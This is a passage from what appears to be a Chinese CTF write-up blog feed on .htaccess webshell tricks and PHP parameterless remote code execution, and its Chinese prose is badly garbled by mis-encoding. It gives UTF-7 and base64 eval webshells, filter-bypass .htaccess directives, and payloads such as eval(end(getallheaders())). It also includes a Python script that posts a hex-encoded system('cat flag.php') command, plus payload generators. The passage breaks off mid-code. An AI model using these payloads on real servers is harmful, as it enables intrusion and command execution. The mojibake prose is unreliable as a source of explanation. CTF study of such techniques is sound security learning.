åçš„Webshell</span></code></pre><p>ä½¿ç”¨data://åè®®ä¹Ÿå¯ä»¥:</p><pre><code class="hljs apache"><span class="hljs-attribute">php_value</span> auto_append_file data://text/plain;base<span class="hljs-number">64</span>,PD<span class="hljs-number">9</span>waHAgcGhwaW<span class="hljs-number">5</span>mbygpOz<span class="hljs-number">8</span>+</code></pre><h5 id="UTF-7-ç¼–ç æ ¼å¼ç»•è¿‡"><a class="header-anchor" href="#UTF-7-ç¼–ç æ ¼å¼ç»•è¿‡">ğŸ­</a>UTF-7 ç¼–ç æ ¼å¼ç»•è¿‡</h5><p>å¦‚æˆ‘ä»¬åœ¨ä¸€ä¸ªå›¾ç‰‡ä¸­å†™å…¥ UTF-7 ç¼–ç æ ¼å¼çš„ Webshellï¼š</p><pre><code class="hljs swift"><span class="hljs-comment">// images.png</span>+<span class="hljs-type">ADw?</span>php eval(+<span class="hljs-type">ACQAXw</span>-<span class="hljs-type">POST</span>+<span class="hljs-type">AFs</span>-whoami+<span class="hljs-type">AF0</span>)+<span class="hljs-type">ADs?</span>+<span class="hljs-type">AD4</span>-</code></pre><ul><li>ä½¿ç”¨ auto_append_file å°†å…¶åŒ…å«è¿›æ¥å¹¶è®¾ç½®ç¼–ç æ ¼å¼ä¸º UTF-7 ï¼š</li></ul><pre><code class="hljs stylus">php_value auto_append_file images.pngphp_flag zend<span class="hljs-selector-class">.multibyte</span> <span class="hljs-number">1</span>php_value zend<span class="hljs-selector-class">.script_encoding</span> <span class="hljs-string">&quot;UTF-7&quot;</span></code></pre><ul><li>ä½¿ç”¨ php://filer ä¼ªåè®®è¿›è¡Œ UTF-7 ä¸ UTF-8 ä¹‹é—´çš„è½¬æ¢ï¼ˆUTF-16ã€UTF-32 ä¹Ÿå¯ä»¥ï¼‰ï¼š</li></ul><pre><code class="hljs ceylon">php<span class="hljs-number">_</span><span class="hljs-keyword">value</span> auto<span class="hljs-number">_</span>append<span class="hljs-number">_f</span>ile <span class="hljs-string">&quot;php://filter/read=convert.iconv.utf-7.utf-8/resource=images.png&quot;</span></code></pre><ul><li>ä½¿ç”¨ .htaccess è‡ªèº«åŒ…å«æ¥æ‰§è¡Œ Webshellï¼š</li></ul><pre><code class="hljs mipsasm">php_value auto_append_file .htaccessphp_flag zend.<span class="hljs-keyword">multibyte </span><span class="hljs-number">1</span>php_value zend.<span class="hljs-keyword">script_encoding </span><span class="hljs-string">&quot;UTF-7&quot;</span><span class="hljs-comment"># +ADw?php eval(+ACQAXw-POST+AFs-whoami+AF0)+ADs?+AD4-</span></code></pre><h2 id="Bypass"><a class="header-anchor" href="#Bypass">ğŸ­</a>Bypass</h2><h4 id="ç»•è¿‡è„å­—ç¬¦"><a class="header-anchor" href="#ç»•è¿‡è„å­—ç¬¦">ğŸ­</a>ç»•è¿‡è„å­—ç¬¦</h4><p>æœ‰çš„é¢˜ç›®ä¼šåœ¨æˆ‘ä»¬ä¸Šä¼ æˆ–å†™å…¥çš„æ–‡ä»¶ä¸­åŠ å…¥ä¸€ä¸ªæ··ä¹±çš„å­—ç¬¦ï¼ˆè„å­—ç¬¦ï¼‰ï¼Œç”±äºè¿™äº›å­—ç¬¦ä¸æ˜¯ .htaccess  æ–‡ä»¶çš„è¯­æ³•æˆ–æŒ‡ä»¤ï¼Œä¼šä½¿æˆ‘ä»¬çš„.htaccessæ–‡ä»¶ä¸ç”Ÿæ•ˆï¼Œå‡ºç°å“åº”500çš„é—®é¢˜ã€‚æ•…æˆ‘ä»¬è¦é‡‡ç”¨ <code>#</code> å¯¹è„å­—ç¬¦è¿›è¡Œæ³¨é‡Šï¼Œæˆ–ä½¿ç”¨åæ–œæ  <code>\</code> å°†æ¢è¡Œç¬¦è½¬ä¹‰æˆæ™®é€šå­—ç¬¦ã€‚</p><h4 id="ç»•è¿‡å…³é”®å­—è¿‡æ»¤"><a class="header-anchor" href="#ç»•è¿‡å…³é”®å­—è¿‡æ»¤">ğŸ­</a>ç»•è¿‡å…³é”®å­—è¿‡æ»¤</h4><p>ä¹Ÿå¯ä»¥ä½¿ç”¨åæ–œæ  <code>\</code> åŠ æ¢è¡Œæ¥å®ç°ã€‚æ¯”å¦‚é¢˜ç›®è¿‡æ»¤äº† typeã€php ç­‰æ•æ„Ÿå­—ç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥ç¼–è¾‘ .htaccessï¼š</p><pre><code class="hljs livescript">AddTy<span class="hljs-string">\</span>pe application/x-httpd-ph<span class="hljs-string">\</span>p .png<span class="hljs-comment"># å³: AddType application/x-httpd-php .png</span></code></pre><h4 id="ç»•è¿‡å¯¹ä¸Šä¼ å›¾ç‰‡çš„å°ºå¯¸é™åˆ¶"><a class="header-anchor" href="#ç»•è¿‡å¯¹ä¸Šä¼ å›¾ç‰‡çš„å°ºå¯¸é™åˆ¶">ğŸ­</a>ç»•è¿‡å¯¹ä¸Šä¼ å›¾ç‰‡çš„å°ºå¯¸é™åˆ¶</h4><p>æœ‰çš„é¢˜ç›®åœ¨å›¾ç‰‡ä¸Šä¼ åŒºä¼šä½¿ç”¨ <code>getimagesize()</code> ç­‰å‡½æ•°å¯¹ä¸Šä¼ çš„å›¾ç‰‡è¿›è¡Œå°ºå¯¸é™åˆ¶ï¼Œåªå…è®¸ä¸Šä¼ æŒ‡å®šå¤§å°å°ºå¯¸çš„å›¾ç‰‡ï¼Œå¹¶ä¸”ä¼šä½¿ç”¨ <code>exif_imagetype()</code> å‡½æ•°è¯»å–ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶å›¾ç‰‡ç±»å‹ã€‚æ­¤æ—¶å¦‚æœå¯ä»¥ä¸Šä¼  .htaccess æ¥è§£æå›¾ç‰‡çš„è¯æˆ‘ä»¬è¿˜éœ€è¦è®© .htaccess çš„å°ºå¯¸å’Œç»è¿‡  <code>exif_imagetype()</code>  æ£€æµ‹ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>exif_imagetype()</code> å‡½æ•°æ”¯æŒçš„ WBMP å›¾åƒç±»å‹ç»•è¿‡ã€‚WBMPï¼ˆWireless Bitmapï¼‰æ˜¯ä¸€ç§ç§»åŠ¨è®¡ç®—æœºè®¾å¤‡ä½¿ç”¨çš„æ ‡å‡†å›¾åƒæ ¼å¼ï¼Œæ˜¯ä¸€ç§çº¯æ–‡æœ¬äºŒè¿›åˆ¶å›¾åƒæ ¼å¼çš„å›¾ç‰‡ï¼Œå®ä¾‹ï¼š</p><pre><code class="hljs apache"><span class="hljs-comment">#define test_width 16</span><span class="hljs-comment">#define test_height 7</span><span class="hljs-attribute">static</span> char test_bits[] = &#123;<span class="hljs-attribute">0x13</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">15</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">93</span>, <span class="hljs-number">0</span>xcd, <span class="hljs-number">0</span>x<span class="hljs-number">55</span>, <span class="hljs-number">0</span>xa<span class="hljs-number">5</span>, <span class="hljs-number">0</span>x<span class="hljs-number">93</span>, <span class="hljs-number">0</span>xc<span class="hljs-number">5</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">80</span>,<span class="hljs-attribute">0x00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">60</span> &#125;;</code></pre><p>WBMP å›¾åƒçš„å¼€å¤´å¯ä»¥ä½¿ç”¨ <code>#</code> è®¾ç½®å›¾åƒçš„å°ºå¯¸å¤§å°ï¼Œå‡è®¾é¢˜ç›®é™åˆ¶æˆ‘ä»¬ä¸Šä¼ çš„å›¾ç‰‡å°ºå¯¸å¿…é¡»ä¸º1x1ï¼Œæˆ‘ä»¬åœ¨ä¸Šä¼ .htaccessæ—¶å°±å¯ä»¥ç”¨ WBMP ç»•è¿‡ï¼š</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> width 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> height 1</span>AddType application/x-httpd-php images.png</code></pre><p>å®ä¾‹å†™åœ¨å¦ä¸€ç¯‡æ–‡ç« ï¼š<a href="https://liquor-boop.github.io/2021/08/11/ffi/">buuï¼ˆå…«)</a></p><p>å‚è€ƒï¼š<a href="https://whoamianony.top/2021/04/30/Web%E5%AE%89%E5%85%A8/%E4%B8%8E%20.htaccess%20%E7%9B%B8%E5%85%B3%E7%9A%84%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/">https://whoamianony.top/2021/04/30/Webå®‰å…¨/ä¸ .htaccess ç›¸å…³çš„å¥‡æ·«æŠ€å·§/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>.htaccess</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHPæ— å‚æ•°RCE</title>
    <link href="/2021/08/08/cmd/"/>
    <url>/2021/08/08/cmd/</url>
    
    <content type="html"><![CDATA[<p>ä¹‹å‰æ— æ•°å­—å­—æ¯shellé‡Œåªåšåˆ°äº†<code>/[A-Za-z0-9_$]+/</code>è¿™æ ·çš„é™åˆ¶ï¼Œä½†æ˜¯é‡åˆ°çš„å…¶ä»–é¢˜ç›®åšäº†å¾ˆå¤šé™åˆ¶ï¼Œä¹‹å‰çš„ç»•è¿‡å°±è¡Œä¸é€šï¼Œæ¯”å¦‚åƒè¿™æ ·çš„ï¼š</p><pre><code class="hljs gherkin">/[A-Za-z0-9]|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">&quot;</span>|<span class="hljs-string">`</span>|<span class="hljs-string">\ </span>|<span class="hljs-string">,</span>|<span class="hljs-string">\.</span>|<span class="hljs-string">-</span>|<span class="hljs-string">\+</span>|<span class="hljs-string">=</span>|<span class="hljs-string">\/</span>|<span class="hljs-string">\\</span>|<span class="hljs-string">&lt;</span>|<span class="hljs-string">&gt;</span>|<span class="hljs-string">\$</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">\^</span>|<span class="hljs-string">&amp;</span>|<span class="hljs-string">\</span>|<span class="hljs-string">/ï¼Œ</span></code></pre><p>å°±åªèƒ½æ— å‚RCEäº†ã€‚</p><h2 id="demo"><a class="header-anchor" href="#demo">ğŸ­</a>demo</h2><pre><code class="hljs autoit"><span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, $_GET[<span class="hljs-string">&#x27;code&#x27;</span>])) &#123;    <span class="hljs-built_in">eval</span>($_GET[<span class="hljs-string">&#x27;code&#x27;</span>])<span class="hljs-comment">;</span></code></pre><blockquote><p>(?R)å¼•ç”¨å½“å‰è¡¨è¾¾å¼ï¼Œ?é€’å½’è°ƒç”¨ï¼Œ\WåŒ¹é…éå•è¯å­—ç¬¦</p></blockquote><p>å…ˆç”¨å·¥å…·æµ‹è¯•ä¸€ä¸‹</p><p><img src="/2021/08/08/cmd/3.png" alt="3"></p><p>æ»¡è¶³æ ¼å¼ï¼Œå¼€å§‹æ„é€ payloadã€‚</p><h2 id="payload"><a class="header-anchor" href="#payload">ğŸ­</a>payload</h2><h5 id="getenv"><a class="header-anchor" href="#getenv">ğŸ­</a>getenv()</h5><img src="/2021/08/08/cmd/4.png" alt="4" style="zoom: 50%;"><pre><code class="hljs lisp">var_dump(<span class="hljs-name">getenv</span>(<span class="hljs-name">phpinfo</span>()))<span class="hljs-comment">;</span></code></pre><p>getenv() è·å–ä¸€ä¸ªç¯å¢ƒå˜é‡çš„å€¼ï¼Œphpinfo() è·å–å…¨éƒ¨çš„ç¯å¢ƒå˜é‡ï¼Œï¼ˆä½†æ˜¯ç›´æ¥phpinfo()å¥½åƒä¸€æ ·ï¼‰</p><p>æµ‹è¯•ä¸€ä¸‹ï¼š</p><p><img src="/2021/08/08/cmd/6.png" alt="6"></p><h5 id="getallheaders"><a class="header-anchor" href="#getallheaders">ğŸ­</a>getallheaders()</h5><pre><code class="hljs lisp">eval(<span class="hljs-name">end</span>(<span class="hljs-name">getallheaders</span>()))<span class="hljs-comment">;</span></code></pre><p>end() å°†æ•°ç»„çš„å†…éƒ¨æŒ‡é’ˆç§»åˆ°æœ€åä¸€ä¸ªï¼Œgetallheaders() è·å–æ‰€æœ‰çš„httpè¯·æ±‚å¤´ã€‚</p><p>æµ‹è¯•ä¸€ä¸‹demoï¼š</p><img src="/2021/08/08/cmd/5.png" alt="5" style="zoom:67%;"><p>ä½†æ˜¯åœ¨bpé‡Œæ–°å»ºä¸€ä¸ªå“åº”å¤´å¥½åƒä¸è¡Œï¼ˆå¦‚ä¸‹é¢çš„ä¾‹é¢˜ï¼‰ï¼Œè¿™æ—¶å€™å¯ä»¥å°è¯•ä¿®æ”¹uaå¤´ï¼Œå°†endæ”¹æˆnextï¼›</p><h5 id="get-defined-vars"><a class="header-anchor" href="#get-defined-vars">ğŸ­</a>get_defined_vars()</h5><pre><code class="hljs lisp">eval(<span class="hljs-name">end</span>(<span class="hljs-name">current</span>(<span class="hljs-name">get_defined_vars</span>())))<span class="hljs-comment">;&amp;jiang=phpinfo();</span></code></pre><p><strong><code>get_defined_vars()</code><strong>è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ï¼Œä¼šè¿”å›</strong><code>$_GET,$_POST,$_COOKIE,$_FILES</code><strong>å…¨å±€å˜é‡çš„å€¼,è¿”å›æ•°ç»„é¡ºåºä¸º</strong><code>get-&gt;post-&gt;cookie-&gt;files</code></strong>ï¼Œ<strong><code>current()</code></strong> è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒï¼Œåˆå§‹æŒ‡å‘æ’å…¥åˆ°æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå•å…ƒï¼Œä¹Ÿå°±æ˜¯ä¼šè¿”å›**<code>$_GET</code>**å˜é‡çš„æ•°ç»„å€¼ã€‚å½“éœ€è¦çš„å€¼æ˜¯<code>$post</code>æ—¶æŠŠ<code>current</code> æ”¹æˆ<code>next</code> å³å¯ã€‚</p><p>è€Œå¦‚æœç½‘ç«™å¯¹<code>$_GET,$_POST,$_COOKIE</code>éƒ½åšçš„è¿‡æ»¤ï¼Œ é‚£æˆ‘ä»¬åªèƒ½ä»<code>$_FILES</code>å…¥æ‰‹äº†ï¼Œexpï¼š</p><pre><code class="hljs routeros">import requestsdef str2hex(payload):  txt = <span class="hljs-string">&#x27;&#x27;</span>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload:      txt += hex(ord(i))[-2:]  return txtpayload = str2hex(<span class="hljs-string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>)files = &#123;    payload: b<span class="hljs-string">&#x27;extrader&#x27;</span>&#125;r = requests.post(<span class="hljs-string">&quot;http://xxx/index.php?exp=eval(hex2bin(array_rand(end(get_defined_vars()))));&quot;</span>, <span class="hljs-attribute">files</span>=files, <span class="hljs-attribute">allow_redirects</span>=<span class="hljs-literal">False</span>)  # <span class="hljs-attribute">allow_redirects</span>=<span class="hljs-literal">False</span> ç¦ç”¨é‡å®šå‘å¤„ç†<span class="hljs-builtin-name">print</span>(r.content.decode())</code></pre><blockquote><p>**array_rand()ï¼š<strong>ä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒï¼Œå¦‚æœåªå–å‡ºä¸€ä¸ªï¼Œ</strong><code>array_rand()</code>**è¿”å›éšæœºå•å…ƒçš„é”®åã€‚ å¦åˆ™å°±è¿”å›åŒ…å«éšæœºé”®åçš„æ•°ç»„</p></blockquote><h5 id="session-start"><a class="header-anchor" href="#session-start">ğŸ­</a>session_start()</h5><pre><code class="hljs reasonml">show<span class="hljs-constructor">_source(<span class="hljs-params">session_id</span>(<span class="hljs-params">session_start</span>()</span>));var<span class="hljs-constructor">_dump(<span class="hljs-params">file_get_contents</span>(<span class="hljs-params">session_id</span>(<span class="hljs-params">session_start</span>()</span>)))highlight<span class="hljs-constructor">_file(<span class="hljs-params">session_id</span>(<span class="hljs-params">session_start</span>()</span>));readfile(session<span class="hljs-constructor">_id(<span class="hljs-params">session_start</span>()</span>)); æˆ–è€…readgzfile<span class="hljs-literal">()</span>;#ä¿®æ”¹cookie : PHPSESSID= filename</code></pre><p>or</p><pre><code class="hljs autoit"><span class="hljs-built_in">eval</span>(hex2bin(session_id(session_start())))<span class="hljs-comment">;</span><span class="hljs-meta">#æŠ“åŒ…ä¼ å…¥Cookie: PHPSESSID=(<span class="hljs-string">&quot;system(&#x27;å‘½ä»¤&#x27;)&quot;</span>çš„åå…­è¿›åˆ¶)</span></code></pre><p>æµ‹è¯•ï¼š<img src="/2021/08/08/cmd/9.png" alt="9"></p><h5 id="scandir"><a class="header-anchor" href="#scandir">ğŸ­</a>scandir()</h5><p>è¯»å–æ–‡ä»¶</p><pre><code class="hljs reasonml">å½“å‰ç›®å½•ï¼šhighlight<span class="hljs-constructor">_file(<span class="hljs-params">array_rand</span>(<span class="hljs-params">array_flip</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">getcwd</span>()</span>))));ä¸Šçº§ç›®å½•æ–‡ä»¶ï¼šhighlight<span class="hljs-constructor">_file(<span class="hljs-params">array_rand</span>(<span class="hljs-params">array_flip</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">dirname</span>(<span class="hljs-params">chdir</span>(<span class="hljs-params">dirname</span>(<span class="hljs-params">getcwd</span>()</span>)))))));#éšæœºè·å–</code></pre><p>å¯ä»¥é…åˆ æ•°ç»„çš„æŒ‡é’ˆï¼Œå€’åºï¼Œç­‰å„ç§æ–¹å¼æ‰¾åˆ°æˆ‘ä»¬éœ€è¦çš„æ–‡ä»¶ï¼š</p><ul><li><p><strong>getchwd()</strong> ï¼šå‡½æ•°è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚</p></li><li><p><strong>scandir()</strong> ï¼šå‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚</p></li><li><p><strong>dirname()</strong> ï¼šå‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚</p></li><li><p><strong>chdir()</strong> ï¼šå‡½æ•°æ”¹å˜å½“å‰çš„ç›®å½•ã€‚</p></li><li><p><strong>array_flip()</strong>ï¼šäº¤æ¢æ•°ç»„ä¸­çš„é”®å’Œå€¼ï¼ŒæˆåŠŸæ—¶è¿”å›äº¤æ¢åçš„æ•°ç»„ï¼Œå¦‚æœå¤±è´¥è¿”å› <strong><code>NULL</code></strong>ã€‚</p></li><li><p><strong>array_rand()</strong>ï¼šä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒï¼Œå¦‚æœåªå–å‡ºä¸€ä¸ª(é»˜è®¤ä¸º1)ï¼Œ<strong>array_rand()</strong> è¿”å›éšæœºå•å…ƒçš„é”®åã€‚ å¦åˆ™å°±è¿”å›åŒ…å«éšæœºé”®åçš„æ•°ç»„ã€‚ å®Œæˆåï¼Œå°±å¯ä»¥æ ¹æ®éšæœºçš„é”®è·å–æ•°ç»„çš„éšæœºå€¼ã€‚</p></li></ul><blockquote><p>array_flip()å’Œarray_rand()é…åˆä½¿ç”¨å¯éšæœºè¿”å›å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶å</p></blockquote><blockquote><p>dirname(chdir(dirname()))é…åˆåˆ‡æ¢æ–‡ä»¶è·¯å¾„</p></blockquote><blockquote><p>current(localeconv())ï¼š</p><blockquote><p>localeconv()ï¼šè¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„,æ•°ç»„ç¬¬ä¸€é¡¹å°±æ˜¯å°æ•°ç‚¹å­—ç¬¦(è¿‡æ»¤è¯¥å­—ç¬¦æ—¶å¯ç”¨)</p></blockquote></blockquote><p>è¿˜æœ‰ä¸€ç³»åˆ—å‡½æ•°ï¼š<strong>floor()</strong>ï¼šèˆå»æ³•å–æ•´ï¼Œ<strong>sqrt()</strong>ï¼šå¹³æ–¹æ ¹ï¼Œ<strong>tan()</strong>ï¼šæ­£åˆ‡å€¼ï¼Œ<strong>cosh()</strong>ï¼šåŒæ›²ä½™å¼¦ï¼Œ<strong>sinh()</strong>ï¼šåŒæ›²æ­£å¼¦ï¼Œ<strong>ceil()</strong>ï¼šè¿›ä¸€æ³•å–æ•´ã€‚å¯ä»¥ç»„åˆä½¿ç”¨ï¼š</p><ul><li><code>phpversion()</code></li><li><code>floor(phpversion())</code></li><li><code>sqrt(floor(phpversion()))</code></li><li><code>tan(floor(sqrt(floor(phpversion()))))</code></li><li><code>cosh(tan(floor(sqrt(floor(phpversion())))))</code></li><li><code>sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))</code></li><li><code>ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))</code></li><li><code>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))</code>è¿”å›<code>.</code></li><li><code>var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))</code>æ‰«æå½“å‰ç›®å½•</li><li><code>next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))</code>è¿”å›<code>..</code></li></ul><h5 id="æ•°ç»„æ“ä½œ"><a class="header-anchor" href="#æ•°ç»„æ“ä½œ">ğŸ­</a>æ•°ç»„æ“ä½œ</h5><ul><li><a href="https://www.w3school.com.cn/php/func_array_end.asp">end()</a> ï¼š å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li><li><a href="https://www.w3school.com.cn/php/func_array_next.asp">next()</a> ï¼šå°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li><li><a href="https://www.w3school.com.cn/php/func_array_prev.asp">prev()</a> ï¼šå°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li><li><a href="https://www.w3school.com.cn/php/func_array_reset.asp">reset()</a> ï¼š å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li><li><a href="https://www.w3school.com.cn/php/func_array_each.asp">each()</a> ï¼š è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨</li></ul><h2 id="æå®¢å¤§æŒ‘æˆ˜-2020-Roamphp4-Rceme"><a class="header-anchor" href="#æå®¢å¤§æŒ‘æˆ˜-2020-Roamphp4-Rceme">ğŸ­</a>[æå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp4-Rceme</h2><p>åœ¨æ§åˆ¶å°é‡Œçœ‹åˆ°æç¤º</p><img src="/2021/08/08/cmd/1.png" alt="1" style="zoom:67%;"><p>.index.php.swp å¯ä»¥è·å–æºç ï¼š</p><p><img src="/2021/08/08/cmd/2.png" alt="2"></p><p>æœ‰ä¹±ç ï¼Œç”¨vimæ¢å¤ï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);session_start();<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_SESSION[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;    $_SESSION[<span class="hljs-string">&#x27;code&#x27;</span>] = substr(md5(mt_rand().sha1(mt_rand)),<span class="hljs-number">0</span>,<span class="hljs-number">5</span>);&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;cmd&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;    <span class="hljs-keyword">if</span>(substr(md5($_POST[<span class="hljs-string">&#x27;code&#x27;</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">5</span>) !== $_SESSION[<span class="hljs-string">&#x27;code&#x27;</span>])&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;script&gt;alert(\&#x27;Captcha error~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);    &#125;    $_SESSION[<span class="hljs-string">&#x27;code&#x27;</span>] = substr(md5(mt_rand().sha1(mt_rand)),<span class="hljs-number">0</span>,<span class="hljs-number">5</span>);    $code = $_POST[<span class="hljs-string">&#x27;cmd&#x27;</span>];    <span class="hljs-keyword">if</span>(strlen($code) &gt; <span class="hljs-number">70</span> <span class="hljs-keyword">or</span> preg_match(<span class="hljs-string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/ixm&#x27;</span>,$code))&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;script&gt;alert(\&#x27;Longlone not like you~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, $code))&#123;        @<span class="hljs-keyword">eval</span>($code);        <span class="hljs-keyword">die</span>();    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>å­—ç¬¦é•¿åº¦æœ‰é™åˆ¶ï¼Œè¿‡æ»¤å¾ˆå¤šç¬¦å·</p><pre><code class="hljs gherkin">/[A-Za-z0-9]|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">&quot;</span>|<span class="hljs-string">`</span>|<span class="hljs-string">\ </span>|<span class="hljs-string">,</span>|<span class="hljs-string">\.</span>|<span class="hljs-string">-</span>|<span class="hljs-string">\+</span>|<span class="hljs-string">=</span>|<span class="hljs-string">\/</span>|<span class="hljs-string">\\</span>|<span class="hljs-string">&lt;</span>|<span class="hljs-string">&gt;</span>|<span class="hljs-string">\$</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">\^</span>|<span class="hljs-string">&amp;</span>|<span class="hljs-string">\</span>|<span class="hljs-string">/ï¼Œ</span></code></pre><p>è¿‡æ»¤äº† å¼‚æˆ– ï¼Œæˆ–ï¼›å–åè¿˜åœ¨ï¼Œåªèƒ½æ— å‚RCEäº†,æµ‹è¯•ä¸€ä¸‹ï¼š</p><img src="/2021/08/08/cmd/10.png" alt="10" style="zoom: 67%;"><p>ç¬¦åˆï¼Œç”¨è„šæœ¬ç”Ÿæˆ</p><pre><code class="hljs livecodeserver">def <span class="hljs-literal">one</span>(s):    ss = <span class="hljs-string">&quot;&quot;</span>    <span class="hljs-keyword">for</span> <span class="hljs-keyword">each</span> <span class="hljs-keyword">in</span> s:        ss += <span class="hljs-string">&quot;%&quot;</span> + str(hex(<span class="hljs-number">255</span> - ord(<span class="hljs-keyword">each</span>)))[<span class="hljs-number">2</span>:].<span class="hljs-built_in">upper</span>()    <span class="hljs-literal">return</span> f<span class="hljs-string">&quot;[~&#123;ss&#125;][!%FF](&quot;</span><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:    <span class="hljs-keyword">a</span> = input(<span class="hljs-string">&quot;:&gt;&quot;</span>).strip(<span class="hljs-string">&quot;)&quot;</span>)    aa = <span class="hljs-keyword">a</span>.<span class="hljs-built_in">split</span>(<span class="hljs-string">&quot;(&quot;</span>)    s = <span class="hljs-string">&quot;&quot;</span>    <span class="hljs-keyword">for</span> <span class="hljs-keyword">each</span> <span class="hljs-keyword">in</span> aa[:<span class="hljs-number">-1</span>]:        s += <span class="hljs-literal">one</span>(<span class="hljs-keyword">each</span>)    s += <span class="hljs-string">&quot;)&quot;</span> * (<span class="hljs-built_in">len</span>(aa) - <span class="hljs-number">1</span>) + <span class="hljs-string">&quot;;&quot;</span>    print(s)</code></pre><p>payload</p><pre><code class="hljs lisp">system(<span class="hljs-name">next</span>(<span class="hljs-name">getallheaders</span>()))<span class="hljs-comment">;</span></code></pre><p>é¢˜ç›®ä¼ cmdåŒæ—¶ä¼šéšæœºå¯¹codeåšå‡ºé™åˆ¶</p><pre><code class="hljs apache"><span class="hljs-attribute">if</span>:substr(md<span class="hljs-number">5</span>($code),<span class="hljs-number">0</span>,<span class="hljs-number">5</span>)==<span class="hljs-number">69622</span></code></pre><p>å€¼æ¯æ¬¡ä¸åŒï¼Œéœ€è¦çˆ†ç ´</p><pre><code class="hljs isbl"><span class="hljs-variable">import</span> <span class="hljs-variable">hashlib</span><span class="hljs-variable">for</span> <span class="hljs-variable">i</span> <span class="hljs-variable"><span class="hljs-keyword">in</span></span> <span class="hljs-function"><span class="hljs-title">range</span>(<span class="hljs-number">9999999</span>):</span><span class="hljs-function">    <span class="hljs-variable">md5_ins</span> = <span class="hljs-variable">hashlib.md5</span>((<span class="hljs-title">str</span>(<span class="hljs-variable">i</span>)).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))</span>    <span class="hljs-variable">a</span>=<span class="hljs-variable">md5_ins.hexdigest</span>()    <span class="hljs-variable"><span 